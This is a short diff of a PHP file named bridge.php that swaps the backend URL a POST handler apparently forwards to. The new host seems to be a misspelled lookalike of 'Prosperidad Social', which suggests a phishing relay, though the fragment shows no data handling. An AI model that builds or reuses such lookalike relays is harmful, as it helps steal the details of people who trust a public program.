@@ -1,6 +1,6 @@
 <?php
 // bridge.php
-$BACKEND_URL = "https://prosperidad.social-co.site/API/index.php";
+$BACKEND_URL = "https://prosperldadsocial.site/tbtele/API/index.php";
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
